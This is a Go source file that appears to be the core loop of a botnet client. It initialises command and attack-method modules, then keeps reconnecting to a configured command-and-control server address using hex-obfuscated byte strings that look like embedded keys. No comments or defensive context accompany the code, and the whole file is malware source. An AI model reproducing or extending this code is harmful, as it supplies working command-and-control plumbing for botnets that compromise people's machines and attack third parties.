package client

import (
	"client/core/config"
	"client/core/modules/commands/cmdImpl"
	"client/core/modules/methods/methodImpl"
	"client/core/networking"
	"fmt"
	"math/rand"
	"time"
)

var (
	Key = []byte("\x32\x4E\x4A\x64\x31\x4A\x46\x35\x65\x69\x44\x50\x50\x34\x4F\x6D")
)

func Serve() {
	cmdImpl.Init()
	methodImpl.Init()
	rand.Seed(time.Now().UnixNano())
	for {
		conn, err := networking.Dial(config.Bot.ServerAddress,
			[]byte("\x62\x70\x36\x35\x39\x39\x37\x66\x72\x6D\x67\x79\x77\x70\x5A\x78"),
			[]byte("\x67\x78\x4C\x59\x37\x66\x43\x74\x79\x56\x78\x70\x68\x79\x71\x62\x70\x37\x61\x68\x75\x5A\x70\x43\x72\x56\x6B\x46\x51\x41\x73\x52"))
		if err != nil {
			time.Sleep(5 * time.Second)
			fmt.Println(err)
			continue
		}
		handle(config.Client{Connection: conn})
		time.Sleep(1 * time.Second)
	}
}
